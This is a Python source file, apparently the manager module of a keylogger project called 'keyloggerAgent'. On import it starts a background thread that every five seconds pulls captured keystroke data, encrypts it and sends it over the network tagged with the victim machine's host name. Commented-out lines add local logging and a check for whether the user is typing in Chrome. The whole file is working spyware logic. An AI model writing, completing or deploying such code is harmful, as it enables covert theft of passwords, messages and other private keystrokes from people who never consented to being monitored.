
from keyloggerAgent.encryptor_keylogger import Encryptor
from keyloggerAgent.service_keylogger import ServiceKeyLogger
from keyloggerAgent.Send_to_network import SendToNetwork
import pygetwindow as gw
import time
import threading
import psutil

class ManagerKeyLogger:
    def __init__(self):
        self.service = ServiceKeyLogger()
        self.send_to_network=SendToNetwork()
        self.encryptor = Encryptor()
        # self.writeFile=WriteToFile()
        self.listener_running = False
        self.manager_thread_collect_data = threading.Thread(target=self.collect_data)
        self.manager_thread_collect_data.start()
        self.decrypt=None




    def collect_data(self):
        while True:
            time.sleep(5)
            data = self.service.get_data()
            if data:
              text_encrypt=self.encryptor.encrypt(data)

              self.send_to_network.write(text_encrypt,self.service.host_name)

              # self.writeFile.write(text_encrypt)
              # data_json = self.writeFile.load_data()
              # decrypt = self.encryptor.decrypt(data_json)
              # self.decrypt=decrypt
              # self.get_data(decrypt)
              print(self.service.host_name)
              print("Original Data:", data)
              print("Encrypted Data:", text_encrypt)
              # print("Data from File:", data_json)
              # print("Decrypted Data:", decrypt)
              # print(decrypt)
    def get_data(self):
        return self.decrypt

    # def is_keyboard_in_chrome(self):
    #     active_window = gw.getActiveWindow()
    #
    #     return active_window and "chrome" in active_window.title.lower()

manager = ManagerKeyLogger()
